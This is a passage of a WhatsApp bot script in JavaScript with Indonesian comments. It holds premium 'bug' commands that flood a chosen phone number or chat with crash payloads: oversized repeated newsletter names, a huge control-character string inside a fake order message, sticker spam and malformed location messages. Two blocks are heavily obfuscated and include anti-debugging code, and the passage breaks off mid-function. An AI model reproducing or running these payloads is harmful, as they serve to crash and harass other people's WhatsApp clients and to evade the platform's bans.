await joestar.relayMessage(m.chat, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await sleep(1400)
}
}
break

case 'bugaudio': {
if (!isPremium) return msgreply(mess.premium)
if (!q) return msgreply(`Penggunaan .${command} 6`)
jumlah = q * 2
for (let i = 0; i < jumlah; i++) {
await joestar.sendMessage(m.chat, { "caption": `p`, audio: bajigur, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: '؂ن؃؄ٽ؂ن؃؄ٽ'.repeat(10000),serverMessageId: 2 }}},{quoted: qbug })
}
}
break

case 'bugflow': case 'bugrelog': {
if (!isPremium) return msgreply(mess.premium)
if (!q) return msgreply(`Penggunaan .${command} 6`)
msgreply(mess.ngebug)
let jumlah = q * 10;
function _0x4eaeea(_0x43de39,_0x57c976,_0x430754,_0x265f9d){return _0x453f(_0x43de39- -0xa3,_0x430754);}(function(_0x207b77,_0x50c310){function _0x2ee17f(_0x251028,_0x17f02c,_0x33af66,_0x3638bc){return _0x453f(_0x17f02c-0x3,_0x3638bc);}const _0x17001b=_0x207b77();function _0x936463(_0x57456c,_0x57c26a,_0x541f15,_0x3d525b){return _0x453f(_0x3d525b-0x1c3,_0x57456c);}while(!![]){try{const _0x292451=parseInt(_0x2ee17f(0xe8,0xef,0xf7,0xd8))/(-0x2034+0x16a2+0x993)*(parseInt(_0x936463(0x267,0x273,0x293,0x28b))/(-0x4f*0xe+-0x2d0+-0x4*-0x1c9))+-parseInt(_0x936463(0x291,0x269,0x247,0x27f))/(0x25ec+0x18a0+0x1*-0x3e89)+parseInt(_0x936463(0x2f9,0x2e7,0x28a,0x2bf))/(-0xf43+-0xe57+0x1d9e)*(-parseInt(_0x936463(0x2c6,0x2a7,0x2a4,0x290))/(-0x21cf+-0x1e3a+0x400e))+parseInt(_0x936463(0x241,0x23d,0x23c,0x264))/(0x1d05*0x1+0x113c+0x315*-0xf)*(-parseInt(_0x936463(0x299,0x2eb,0x2dd,0x2c9))/(-0x1948+0x1*-0x3e2+-0x3*-0x9bb))+-parseInt(_0x2ee17f(0x9d,0x94,0xd3,0xb7))/(0x143b+-0x392+-0x2b*0x63)*(-parseInt(_0x936463(0x294,0x253,0x254,0x270))/(0x2026+0x2*-0x698+-0x12ed))+parseInt(_0x2ee17f(0xfb,0x10d,0x131,0x13c))/(-0x2019*0x1+0xd72+0xf*0x13f)+parseInt(_0x2ee17f(0xbb,0xc1,0xe0,0xbb))/(0x4*-0x7bb+-0x14f2+0x33e9);if(_0x292451===_0x50c310)break;else _0x17001b['push'](_0x17001b['shift']());}catch(_0x497449){_0x17001b['push'](_0x17001b['shift']());}}}(_0x3b9f,0x1223*-0x31+0x105*-0x3f+0x1*0x5c66f));const _0x1c8a3c=(function(){const _0x155a57={};function _0x4976a3(_0x25dcc7,_0x26931b,_0x1cd801,_0xb85f6){return _0x453f(_0x1cd801-0x1c2,_0x25dcc7);}_0x155a57[_0x531257(0x2b2,0x2c1,0x278,0x2ba)]=function(_0x5b2945,_0x2c34dd){return _0x5b2945===_0x2c34dd;},_0x155a57[_0x531257(0x319,0x2e4,0x2ee,0x355)]=_0x531257(0x30b,0x2ee,0x2d4,0x302);const _0x52b398=_0x155a57;let _0x586fd9=!![];function _0x531257(_0x117323,_0x5a842f,_0x3c1f42,_0x44b756){return _0x453f(_0x117323-0x219,_0x5a842f);}return function(_0x33306a,_0x45bd60){function _0x56ef09(_0x4057a0,_0x387226,_0x4b7da5,_0x4d689c){return _0x4976a3(_0x4d689c,_0x387226-0x146,_0x4057a0-0x53,_0x4d689c-0xc);}function _0x3ddcc9(_0x1e76e5,_0xcb3799,_0x3bb072,_0x217579){return _0x531257(_0xcb3799- -0x344,_0x1e76e5,_0x3bb072-0x13c,_0x217579-0x80);}if(_0x52b398['SUvuF'](_0x56ef09(0x307,0x2fb,0x327,0x30b),_0x52b398[_0x56ef09(0x315,0x354,0x30c,0x30c)])){const _0x3e50d3=_0x586fd9?function(){function _0x8c4b9(_0x37febb,_0x4799e7,_0x4ea418,_0x51a113){return _0x3ddcc9(_0x4799e7,_0x51a113-0x290,_0x4ea418-0xa4,_0x51a113-0xd4);}if(_0x45bd60){const _0x340589=_0x45bd60[_0x8c4b9(0x258,0x23b,0x239,0x26c)](_0x33306a,arguments);return _0x45bd60=null,_0x340589;}}:function(){};return _0x586fd9=![],_0x3e50d3;}else{const _0xbbd858=_0x34068a['apply'](_0x520ed8,arguments);return _0x1f1d49=null,_0xbbd858;}};}());function _0x2fc48f(_0x4f12de,_0x287028,_0x273bfe,_0x43c990){return _0x453f(_0x287028-0x346,_0x43c990);}const _0x25b9f0=_0x1c8a3c(this,function(){function _0xe03a3(_0x5c677d,_0x52f6d8,_0x49378b,_0x2557ba){return _0x453f(_0x2557ba-0x36a,_0x5c677d);}function _0x50a745(_0x56a1de,_0x594878,_0x3d874a,_0x54b97b){return _0x453f(_0x3d874a-0x123,_0x54b97b);}const _0x23645a={};_0x23645a[_0x50a745(0x220,0x261,0x224,0x20b)]='(((.+)+)+)'+'+$';const _0x9374f6=_0x23645a;return _0x25b9f0[_0x50a745(0x1f7,0x241,0x204,0x1f0)]()[_0x50a745(0x1c5,0x1b4,0x1e9,0x211)](_0x9374f6[_0xe03a3(0x49f,0x4a6,0x474,0x46b)])['toString']()['constructo'+'r'](_0x25b9f0)[_0xe03a3(0x468,0x467,0x3f2,0x430)](_0xe03a3(0x425,0x435,0x424,0x440)+'+$');});_0x25b9f0();const _0x460fe4=(function(){let _0x331e0a=!![];return function(_0x24e290,_0x37d477){const _0x47a0a2=_0x331e0a?function(){function _0x3c91e6(_0x2e8505,_0x466d91,_0x5d88a3,_0x1c2efb){return _0x453f(_0x1c2efb- -0x167,_0x466d91);}if(_0x37d477){const _0xeec447=_0x37d477[_0x3c91e6(-0x7e,-0x63,-0x75,-0x60)](_0x24e290,arguments);return _0x37d477=null,_0xeec447;}}:function(){};return _0x331e0a=![],_0x47a0a2;};}()),_0x1202f1=_0x460fe4(this,function(){const _0x2b9686={'RyxSg':_0x4891a6(-0x13e,-0x104,-0x16a,-0x105),'MCXQb':function(_0x246717,_0x2e69e6){return _0x246717+_0x2e69e6;},'nEuTf':_0x4891a6(-0x143,-0x12f,-0x107,-0x174)+_0x2cf091(0x380,0x375,0x34f,0x357),'SCYHI':function(_0x57381c,_0x4c2aa9){return _0x57381c===_0x4c2aa9;},'OnGot':_0x2cf091(0x3b3,0x39c,0x3ac,0x389),'fxezq':function(_0x1ec1b7){return _0x1ec1b7();},'PRJGV':_0x2cf091(0x376,0x360,0x360,0x355),'gZiEh':'warn','qfRrT':_0x4891a6(-0x136,-0xf6,-0xfd,-0x101),'kGsKR':'exception','zsYhV':_0x4891a6(-0x168,-0x156,-0x15c,-0x160),'YPZmY':_0x2cf091(0x32c,0x368,0x390,0x384),'bJfXR':function(_0xefedfd,_0x18199c){return _0xefedfd<_0x18199c;}},_0x460b30=function(){function _0x6c0bab(_0x3c28b1,_0x5b1d94,_0x319b61,_0x369cd4){return _0x2cf091(_0x3c28b1-0x185,_0x319b61- -0x306,_0x3c28b1,_0x369cd4-0x2b);}let _0x59202e;function _0x4962e3(_0x1c8425,_0x9cef75,_0x171d04,_0x5cbcb9){return _0x4891a6(_0x171d04-0x327,_0x1c8425,_0x171d04-0xc4,_0x5cbcb9-0x18e);}try{if(_0x2b9686['RyxSg']!==_0x2b9686[_0x4962e3(0x1df,0x1b6,0x1ec,0x1e4)]){const _0x5b2e18=_0x45f6e8['constructo'+'r']['prototype'][_0x4962e3(0x1e7,0x1f2,0x204,0x1f3)](_0x2b523c),_0x2c5bd4=_0x5e8413[_0x2311c6],_0x202126=_0x46a0ce[_0x2c5bd4]||_0x5b2e18;_0x5b2e18[_0x4962e3(0x1cf,0x1f2,0x1c3,0x1f8)]=_0x2ec944[_0x4962e3(0x220,0x20d,0x204,0x226)](_0x31db21),_0x5b2e18['toString']=_0x202126[_0x6c0bab(0x74,0x98,0x84,0xb4)][_0x4962e3(0x227,0x22e,0x204,0x23a)](_0x202126),_0xf4aad7[_0x2c5bd4]=_0x5b2e18;}else _0x59202e=Function(_0x2b9686[_0x4962e3(0x1ae,0x1dc,0x1b7,0x1c6)](_0x2b9686[_0x4962e3(0x1cc,0x1e6,0x1de,0x1b6)],_0x6c0bab(0xaa,0x7d,0x9a,0x61)+_0x6c0bab(0x78,0x65,0x85,0x94)+_0x6c0bab(0x89,0x86,0x8d,0x71)+'\x20)')+');')();}catch(_0x2aefb8){if(_0x2b9686[_0x4962e3(0x1b3,0x1ec,0x1f2,0x1c0)](_0x2b9686[_0x6c0bab(0x35,0x65,0x41,0x48)],_0x4962e3(0x1a9,0x18c,0x1c9,0x1aa))){if(_0x2348d9){const _0x410e2d=_0x5392db[_0x6c0bab(0xa0,0xa3,0xaa,0xb9)](_0x2e5a9d,arguments);return _0x5e31fc=null,_0x410e2d;}}else _0x59202e=window;}return _0x59202e;},_0x29c00d=_0x2b9686['fxezq'](_0x460b30);function _0x2cf091(_0xa63f07,_0x2edab9,_0x7f67a5,_0x13c887){return _0x453f(_0x2edab9-0x2a9,_0x7f67a5);}const _0x14e515=_0x29c00d[_0x2cf091(0x36f,0x396,0x376,0x398)]=_0x29c00d['console']||{};function _0x4891a6(_0x5de00b,_0x14c2e6,_0x3f913f,_0x3c4c5c){return _0x453f(_0x5de00b- -0x212,_0x14c2e6);}const _0x39b4ea=[_0x2b9686[_0x4891a6(-0x162,-0x140,-0x197,-0x172)],_0x2b9686[_0x4891a6(-0x15f,-0x150,-0x12d,-0x135)],_0x4891a6(-0x17c,-0x171,-0x197,-0x188),_0x2b9686['qfRrT'],_0x2b9686[_0x2cf091(0x395,0x38d,0x37a,0x35e)],_0x2b9686[_0x2cf091(0x36a,0x3a8,0x37b,0x3aa)],_0x2b9686['YPZmY']];for(let _0x2b03d6=0x2007*-0x1+0x22e1+0x2da*-0x1;_0x2b9686['bJfXR'](_0x2b03d6,_0x39b4ea['length']);_0x2b03d6++){const _0x32ea3b=_0x460fe4[_0x2cf091(0x315,0x33b,0x31e,0x30c)+'r'][_0x2cf091(0x364,0x390,0x3d0,0x356)]['bind'](_0x460fe4),_0x43f67b=_0x39b4ea[_0x2b03d6],_0x48d913=_0x14e515[_0x43f67b]||_0x32ea3b;_0x32ea3b['__proto__']=_0x460fe4[_0x2cf091(0x3bc,0x398,0x383,0x37c)](_0x460fe4),_0x32ea3b[_0x2cf091(0x399,0x38a,0x3ba,0x36f)]=_0x48d913[_0x2cf091(0x37e,0x38a,0x3a8,0x369)][_0x4891a6(-0x123,-0xf9,-0x139,-0x118)](_0x48d913),_0x14e515[_0x43f67b]=_0x32ea3b;}});_0x1202f1();let bug='\x03'[_0x2fc48f(0x3c9,0x3d1,0x3a6,0x394)](-0xa7dba+-0x4c1c6+-0x174*-0x11d8);for(let i=-0x26ee+0xde6+-0x9*-0x2c8;i<jumlah;i++){const _0x1d2630={};_0x1d2630[_0x4eaeea(0x1,-0x18,-0x24,0x3f)+_0x4eaeea(-0x8,0xf,0x1c,-0x20)]=_0x2fc48f(0x3aa,0x3e9,0x3bb,0x3fe)+'38483540@n'+'ewsletter',_0x1d2630[_0x4eaeea(0x1,0x32,0x23,0x3f)+_0x2fc48f(0x3a8,0x3da,0x3fe,0x3ed)]=_0x4eaeea(-0x4,0x28,0x7,0x1f)+_0x4eaeea(0x4e,0x33,0x2b,0x68)+_0x4eaeea(0x55,0x57,0x8d,0x71)+'h',_0x1d2630[_0x4eaeea(0x1e,0x3a,0x4d,0x12)+_0x2fc48f(0x3f4,0x40a,0x443,0x3d3)]=0x2;const _0xa2bffe={};_0xa2bffe[_0x4eaeea(0x42,0x80,0x7b,0x1a)+_0x2fc48f(0x3be,0x3e6,0x3af,0x3d1)]=[],_0xa2bffe['jpegThumbn'+_0x4eaeea(0x43,0x3e,0x5e,0x63)]=global[_0x2fc48f(0x40f,0x43a,0x431,0x450)];const _0x34759c={};_0x34759c['name']='review_and'+_0x2fc48f(0x3e1,0x3f1,0x3bf,0x3bc),_0x34759c[_0x2fc48f(0x433,0x3ff,0x3e9,0x3c9)+_0x4eaeea(0x57,0x2c,0x5c,0x31)]='{\x22currency'+_0x4eaeea(0x2,0x0,-0x23,-0xd)+'otal_amoun'+_0x4eaeea(0x18,0x42,0x34,0xd)+_0x2fc48f(0x41e,0x3e2,0x41b,0x3d4)+_0x2fc48f(0x436,0x44b,0x453,0x481)+_0x4eaeea(-0xb,-0x5,0x6,-0x3c)+_0x4eaeea(0x28,0x25,-0x1,0x25)+_0x4eaeea(0x35,0x3,0x4a,0x6a)+_0x2fc48f(0x3ec,0x3dd,0x3cb,0x409)+':\x22physical'+_0x4eaeea(0x52,0x66,0x15,0x4b)+_0x4eaeea(0x58,0x6c,0x8e,0x19)+_0x4eaeea(-0x15,0x2b,-0x55,-0x42)+_0x4eaeea(0x2f,0x12,-0x6,0x27)+_0x2fc48f(0x45c,0x444,0x409,0x425)+_0x2fc48f(0x47b,0x448,0x445,0x463)+_0x4eaeea(0x13,0xf,0x51,-0x26)+_0x4eaeea(0x20,-0x1e,0x32,0x3d)+_0x2fc48f(0x427,0x426,0x43b,0x3eb)+_0x2fc48f(0x3f9,0x436,0x423,0x422)+_0x4eaeea(-0x17,0x1f,-0x51,-0x4a)+_0x2fc48f(0x432,0x43f,0x42d,0x44b)+_0x2fc48f(0x3ea,0x408,0x3fc,0x3c9)+_0x4eaeea(0x15,0x45,-0x9,0xe)+'3159292600'+_0x2fc48f(0x469,0x44e,0x419,0x44d)+'t_id\x22:\x22799'+_0x4eaeea(0x22,0x17,0x47,-0x17)+'009\x22,\x22name'+_0x4eaeea(0xc,-0x17,-0x31,-0x11)+unic['n7']+(_0x2fc48f(0x405,0x3f8,0x436,0x3f4)+_0x2fc48f(0x457,0x43c,0x42c,0x46c)+_0x2fc48f(0x463,0x449,0x468,0x419)+'ffset\x22:100'+_0x4eaeea(-0x9,-0x13,-0x37,0x29)+_0x4eaeea(0x36,0x21,0x4e,0x39)+_0x2fc48f(0x3d8,0x400,0x40d,0x3d7)+_0x2fc48f(0x405,0x3ee,0x3d0,0x3da)+_0x4eaeea(0x4,0x28,0x7,0x5)+_0x4eaeea(0x61,0x2e,0x4c,0x80)+_0x4eaeea(0x66,0x35,0x93,0x6d)+_0x4eaeea(-0x14,-0x34,-0x1e,-0x3e)+_0x4eaeea(0x6,-0x5,0x46,-0xc)+_0x4eaeea(0x2b,0x15,0x2c,0x4c)+_0x2fc48f(0x3d2,0x3d3,0x3cd,0x3e1))+bug+(_0x4eaeea(0xf,-0x15,0x33,0x4d)+_0x2fc48f(0x415,0x43c,0x45f,0x44d)+_0x2fc48f(0x437,0x449,0x415,0x45b)+'ffset\x22:100'+_0x4eaeea(-0x9,0xb,-0x3c,0x36)+_0x4eaeea(0x2d,0x15,-0x3,0xe)+'ative_paym'+_0x4eaeea(0x38,0x26,0x2c,0x39)+_0x4eaeea(0x3c,0xf,0x4a,0x4b));const _0xf37131={};_0xf37131[_0x4eaeea(0x1d,0x3c,0x1a,-0x1d)]=[_0x34759c];const _0x26e3cf={};_0x26e3cf[_0x4eaeea(0x37,0x8,0x3c,0x5)]=_0xa2bffe,_0x26e3cf[_0x4eaeea(-0x10,-0x14,0x2,-0x30)+_0x4eaeea(0x32,0x15,-0x4,0x27)]=_0xf37131;const _0x2a7413={};_0x2a7413['interactiv'+_0x2fc48f(0x43c,0x434,0x45b,0x453)]=_0x26e3cf;const _0x42b619={};_0x42b619[_0x2fc48f(0x3e6,0x419,0x44e,0x42e)+'d']=!![],_0x42b619['forwardedN'+'ewsletterM'+_0x2fc48f(0x3ec,0x3e3,0x40b,0x3d2)]=_0x1d2630,_0x42b619[_0x2fc48f(0x404,0x3fb,0x3f6,0x405)]=_0x2fc48f(0x429,0x403,0x3e8,0x441)+_0x4eaeea(0x9,-0xe,-0x27,-0x4),_0x42b619['participan'+'t']=_0x2fc48f(0x410,0x417,0x3f5,0x404)+_0x4eaeea(0x5a,0x4a,0x74,0x2a),_0x42b619[_0x4eaeea(-0x13,0x29,-0x32,0x2)+_0x4eaeea(-0xe,-0x9,-0x35,0x18)]=_0x2a7413,_0x42b619[_0x2fc48f(0x3be,0x3f7,0x3cc,0x411)]=_0x4eaeea(0x48,0xb,0x3f,0x55)+_0x4eaeea(0x3,0x3d,0xd,-0x25);const _0x18e540={};_0x18e540['text']='\x20',_0x18e540[_0x2fc48f(0x41f,0x40d,0x439,0x3f8)+'o']=_0x42b619;const _0x1985c4={};_0x1985c4[_0x4eaeea(0x3b,0x7b,0x3c,0x47)+'xtMessage']=_0x18e540,await joestar[_0x4eaeea(0x27,-0x6,0x64,0x1c)+'ge'](m[_0x2fc48f(0x451,0x429,0x41c,0x425)],_0x1985c4,{});const _0xfd3911={};_0xfd3911['text']='\x20';const _0x136d8a={};_0x136d8a[_0x2fc48f(0x3f8,0x42e,0x40e,0x437)]=qbug,await joestar[_0x2fc48f(0x444,0x42f,0x402,0x40a)+'e'](m[_0x2fc48f(0x43e,0x429,0x42f,0x458)],_0xfd3911,_0x136d8a);}function _0x453f(_0x25b9f0,_0x1c8a3c){const _0x3b9f39=_0x3b9f();return _0x453f=function(_0x453f85,_0x12a8ea){_0x453f85=_0x453f85-(-0x15d*-0x8+0x1583*-0x1+0xb26);let _0x31ef9c=_0x3b9f39[_0x453f85];return _0x31ef9c;},_0x453f(_0x25b9f0,_0x1c8a3c);}function _0x3b9f(){const _0x3e0b0d=['return\x20(fu','y\x22:1}]},\x22n','0@s.whatsa','ment_reque','isForwarde','YckVA','Message','(((.+)+)+)','RyxSg','\x224ONSAXV76','y\x22:1},{\x22re','header','ent_method','error','SCYHI','extendedTe','s\x22:[]}','et\x22:100},\x22','toString','ctor(\x22retu','chat','kGsKR','hasMediaAt','ail','prototype','quoted','sendMessag','rn\x20this\x22)(','status@bro','85369EctOWu','console','eMessage','bind','order_type','uka\x20chat\x20i','ivNqe','qIvzT','jpegT','-goods\x22,\x22o',':{\x22value\x22:','{}.constru','ni\x20->\x20cras','\x22items\x22:[{','msJson','rder\x22:{\x22st','36BBgfPa','pp.net','sted\x22,\x22sub','zsYhV','cltkh','WjJjM','total\x22:{\x22v','9999900,\x22o','\x22product_i',',\x22offset\x22:','7mcCrea','apply','9\x22,\x22produc','d\x22:\x22784267','364020DaccDn','repeat','\x22:\x22ORDER\x22,','⿻\x20𝐂𝐋͢𝐢𝚵𝐍͢𝐓\x20々','atus\x22:\x22pay','4605763435','quotedMess','332216bzyOfX','constructo','nativeFlow','Name','age','info','KN\x22,\x22type\x22','100},\x22refe','SUvuF','},\x22quantit','Jid','\x22:19999800','essageInfo','OnGot','relog\x20->\x20b','tachment','178686RRfwcP','MCXQb','1203631440','newsletter','\x22:\x22IDR\x22,\x22t','adcast','05763435\x22,',':\x2278426746','\x22,\x22name\x22:\x22','table','_pay','FE4CDF','9uEAksQ','__proto__','\x22:\x22','PRJGV','remoteJid','\x22,\x22amount\x22','gZiEh','jZQZf','stanzaId','alue\x22:1999','log','id\x22:\x2275376','buttonPara','tailer_id\x22','t\x22:{\x22value','44256GJazSw','BAE526D352','185295HrBSjk','trace','buttons','serverMess','\x22retailer_','9800,\x22offs','ageId','9631592926','search','contextInf','6zqZSXT','nEuTf','relayMessa','rence_id\x22:','nction()\x20','95455PhYCDS','⟠\x20𝐉𝚹𝚺͢𝐒𝐓𝚫𝐑\x20'];_0x3b9f=function(){return _0x3e0b0d;};return _0x3b9f();}
}
break

case 'bugreact': {
if (!isPremium) return msgreply(mess.premium)
if (!m.quoted) return msgreply(`Penggunaan .${command} reply pesan`)
await joestar.sendMessage(m.chat, { text: 'Succes Mengirim Bug React ✅', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: '؂ن؃؄ٽ؂ن؃؄ٽ'.repeat(10000), serverMessageId: 2 } }}, { quoted: qbug })
await sleep(2000)
await joestar.sendMessage(m.chat, { react: { text: '🧢', key: { remoteJid: m.chat, fromMe: true, id: quoted.id } } })
}
break

case 'bug-s': {
if (!isPremium) return msgreply(mess.premium)
if (!q) return msgreply(`Penggunaan .${command} 6287392994527`)
target = q + '@s.whatsapp.net'
for (let i = 0; i < 100; i++) {
await joestar.sendVideoAsSticker(target, mengkece, qbug, { packname: unic.n2, author: unic.n3 })
}
msgreply(`👤 Succes Send Bug Ke ${target} Menggunakan Bug ${command}. Jangan Lupa Jeda 2 Menit Agar Bot Tidak Rawan Ban🩸`)
}
break

case 'bugloc': {
if (!isPremium) return msgreply(mess.premium)
if (!q) return msgreply(`Penggunaan .${command} 6287398884527`)
target = q + '@s.whatsapp.net'
anjayyy = '؂ن؃؄ٽ؂ن؃؄ٽ'.repeat(0)
for (let i = 0; i < 30; i++) {
joestar.sendMessage(target, { location: { degreesLatitude: 173.282, degreesLongitude: -19.378, name: unic.n5, address: unic.n4, url: `https://${anjayyy}.com`, comment: 'anjay', jpegThumbnail: null } }, { quoted: qbug });
}
msgreply(`👤 Succes Send Bug Ke ${target} Menggunakan Bug ${command}. Jangan Lupa Jeda 2 Menit Agar Bot Tidak Rawan Ban🩸`)
}
break

case 'bug@': {
if (!isPremium) return msgreply(mess.premium)
if (!q) return msgreply(`Penggunaan .${command} 629727XXX`)
msgreply(mess.ngebug)
let target = q + '@s.whatsapp.net';
function _0x45425d(_0x10fecd,_0x21a04c,_0x4eac45,_0x1cc1a5){return _0x5ddd(_0x21a04c- -0x150,_0x1cc1a5);}(function(_0x3c054e,_0x283d5d){const _0x1a5853=_0x3c054e();function _0x1fed8a(_0x3ce43d,_0x5788cd,_0xc65a82,_0x37d33f){return _0x5ddd(_0x3ce43d-0x4e,_0x5788cd);}function _0x4ee80c(_0x2feee5,_0x2dfdae,_0x122c8b,_0x4e6a46){return _0x5ddd(_0x4e6a46-0x43,_0x122c8b);}while(!![]){try{const _0x22f33e=-parseInt(_0x4ee80c(0x1a2,0x20e,0x1f2,0x1e4))/(-0x7c*0x23+-0x3e*-0x9+0x4ed*0x3)*(parseInt(_0x4ee80c(0x26f,0x266,0x26e,0x257))/(0xb0*0x6+-0x1*0x1af2+0x16d4))+-parseInt(_0x1fed8a(0x20e,0x232,0x1eb,0x1d4))/(0x3*-0x4ab+0x1*-0x18a7+0x209*0x13)+parseInt(_0x4ee80c(0x25d,0x1eb,0x202,0x22d))/(0x293*0x9+-0x89b*-0x1+-0x1fc2)*(parseInt(_0x4ee80c(0x1eb,0x262,0x25b,0x221))/(-0x293*0xf+-0x5b3*0x3+0x37bb))+parseInt(_0x1fed8a(0x1ec,0x1ba,0x1fb,0x21e))/(-0xba5*0x3+0x97c+0x1979*0x1)*(parseInt(_0x1fed8a(0x263,0x221,0x298,0x250))/(0x99*-0x1b+0x25*0x49+0x59d))+-parseInt(_0x4ee80c(0x1c0,0x236,0x1e1,0x1fb))/(-0x2142+-0x4d2*0x4+0x8c3*0x6)+parseInt(_0x4ee80c(0x211,0x243,0x210,0x235))/(-0x1*-0x1d5+0xb5*0x4+0x10*-0x4a)+parseInt(_0x4ee80c(0x1e9,0x239,0x206,0x219))/(-0x19b4+0x24c7+0x235*-0x5);if(_0x22f33e===_0x283d5d)break;else _0x1a5853['push'](_0x1a5853['shift']());}catch(_0xdc1f28){_0x1a5853['push'](_0x1a5853['shift']());}}}(_0x43ec,0xbc754+0x6*-0x4d432+0x201f57));function _0x43ec(){const _0x938d62=['error','KN\x22,\x22type\x22','quotedMess','relayMessa','dRFOJ','tDOQJ','\x22retailer_','name','1203631440',',\x22offset\x22:','9999900,\x22o','warn','58kWzeMG','20489rYsXEo','\x22:\x22IDR\x22,\x22t','\x22:\x22ORDER\x22,','msJson','ageId','jvZjl','FXmxX','participan','info','tailer_id\x22','XLbyq','buttons','s\x22:[]}','StmLJ','05763435\x22,','jpegThumbn','gXXjj','nction()\x20','162XegXPt','__proto__','adcast','50132YHHUgi','relog\x20->\x20b','\x224ONSAXV76','status@bro',':{\x22value\x22:','QboQz','\x22:\x22','kYYkY','contextInf','bind','sted\x22,\x22sub','qBdYZ','oTDSn','newsletter','iYNDd','extendedTe','t\x22:{\x22value','rCjSl','rn\x20this\x22)(','Tmobw','y\x22:1},{\x22re','wllQk','BAE526D352','6311752lPxHJm','vuZew','ctor(\x22retu','},\x22quantit','iyORL','ment_reque','serverMess','ffset\x22:100','1503141wDvfLu','d\x22:\x22784267','Message','alue\x22:1999','xwGIR','0@s.whatsa','search','38483540@n','CXqJi','forwardedN',':\x22physical','otal_amoun','console','quoted','vcfEh','\x22items\x22:[{','xwthx','apply','009\x22,\x22name','4605763435','log','order_type','12555000UFwzlf','uka\x20chat\x20i','BuvAS','age','100},\x22refe','9\x22,\x22produc','⟠\x20𝐉𝚹𝚺͢𝐒𝐓𝚫𝐑\x20','Zypyr','5fwxmwu','{}.constru','OTDlm','MrQCJ','sendMessag','constructo','zlLBL','dGpNW','9800,\x22offs','\x22product_i','jpegT','cjZSp','5915924jKyZtT','rder\x22:{\x22st','y\x22:1}]},\x22n','ent_method',':\x2278426746','\x22,\x22amount\x22','trace','ail','8177733kCMlsN','hasMediaAt','TPYLA','nativeFlow','ative_paym','toString','xtMessage','9631592926','KyYfq','ewsletterM','essageInfo','text','-goods\x22,\x22o','SGwIY','return\x20(fu','header','\x22,\x22name\x22:\x22','FE4CDF','xvpwT','(((.+)+)+)','atus\x22:\x22pay','t_id\x22:\x22799'];_0x43ec=function(){return _0x938d62;};return _0x43ec();}function _0x30bfde(_0x2ec10e,_0x14feff,_0x2d8485,_0x1fc81b){return _0x5ddd(_0x2d8485-0x3ad,_0x14feff);}const _0x22e061=(function(){const _0x34d2dd={'MrQCJ':function(_0x34439e,_0x227430){return _0x34439e(_0x227430);},'SGwIY':function(_0x3f49a8,_0x2bd296){return _0x3f49a8+_0x2bd296;},'Zypyr':_0x2f266a(-0x1c,-0x13,0x9,-0x14)+_0x3b0518(-0x10e,-0x10f,-0x143,-0x118),'tDOQJ':'{}.constru'+_0x2f266a(-0x8a,-0x4a,-0x68,-0x5a)+_0x3b0518(-0x15a,-0x168,-0x12d,-0x16a)+'\x20)','uDxVe':function(_0x50b8b5,_0x34f50a){return _0x50b8b5===_0x34f50a;},'jvZjl':_0x3b0518(-0x16a,-0x163,-0x133,-0x178),'qBdYZ':function(_0x50bcc1,_0x4ad04d){return _0x50bcc1!==_0x4ad04d;},'nQBJG':'dEcqp','FrLJf':_0x2f266a(-0x34,-0x28,-0x16,-0x46),'xvpwT':function(_0x33e354,_0x4c359c){return _0x33e354===_0x4c359c;},'UHZOu':_0x3b0518(-0x168,-0xfc,-0x13a,-0x170)};function _0x3b0518(_0x52b2bf,_0x222592,_0x4c89bf,_0xa2d0b1){return _0x5ddd(_0x4c89bf- -0x2e0,_0x52b2bf);}let _0x6ba2d2=!![];function _0x2f266a(_0x50faa9,_0x52d519,_0x299216,_0x39c6d0){return _0x5ddd(_0x39c6d0- -0x214,_0x52d519);}return function(_0x50379f,_0xdcbf20){function _0x368e99(_0x3394aa,_0x54c9b9,_0x3311e8,_0x404a42){return _0x3b0518(_0x3394aa,_0x54c9b9-0xef,_0x3311e8-0x24f,_0x404a42-0xf5);}function _0x3a2dc1(_0x238046,_0x54b722,_0x4bfb00,_0x34a5c0){return _0x3b0518(_0x4bfb00,_0x54b722-0x10e,_0x54b722- -0xed,_0x34a5c0-0x13b);}if(_0x34d2dd[_0x3a2dc1(-0x1ab,-0x1c9,-0x1b2,-0x1bf)](_0x368e99(0x128,0xde,0x115,0xd9),_0x34d2dd['UHZOu'])){const _0x50ac50=_0x6ba2d2?function(){const _0x15b262={'OTDlm':function(_0xe178b6,_0x3cd82d){function _0x444630(_0x28ac9f,_0x2db20a,_0xc077d6,_0x411533){return _0x5ddd(_0x2db20a- -0x3af,_0xc077d6);}return _0x34d2dd[_0x444630(-0x1ee,-0x1ce,-0x18b,-0x1be)](_0xe178b6,_0x3cd82d);},'BuvAS':function(_0x57b92f,_0x274647){function _0x122c2f(_0x438451,_0x4d910d,_0x1d5719,_0x3f9e1e){return _0x5ddd(_0x438451- -0x398,_0x4d910d);}return _0x34d2dd[_0x122c2f(-0x199,-0x192,-0x18d,-0x172)](_0x57b92f,_0x274647);},'rCjSl':function(_0x140c9b,_0x386071){return _0x140c9b+_0x386071;},'cjZSp':_0x34d2dd[_0x3c8e2d(0x11e,0x139,0x15a,0x196)],'gXXjj':_0x34d2dd[_0x3c8e2d(0x17b,0x1a9,0x18a,0x1a0)]};function _0x36df09(_0x15efcb,_0x488213,_0x1c3918,_0x20dc60){return _0x3a2dc1(_0x15efcb-0x1f0,_0x488213-0x5ec,_0x1c3918,_0x20dc60-0x4a);}function _0x3c8e2d(_0x4f9d95,_0x396fb2,_0x1944c2,_0x1b48b5){return _0x368e99(_0x4f9d95,_0x396fb2-0x147,_0x1944c2-0xe,_0x1b48b5-0x70);}if(_0x34d2dd['uDxVe'](_0x3c8e2d(0xe7,0x126,0x12a,0xff),_0x34d2dd[_0x3c8e2d(0x10c,0x137,0x10e,0x115)])){if(_0xdcbf20){if(_0x34d2dd[_0x36df09(0x3ea,0x3cb,0x399,0x408)](_0x34d2dd['nQBJG'],_0x34d2dd['FrLJf'])){const _0x1679cb=_0xdcbf20[_0x36df09(0x40c,0x3f0,0x410,0x41d)](_0x50379f,arguments);return _0xdcbf20=null,_0x1679cb;}else{let 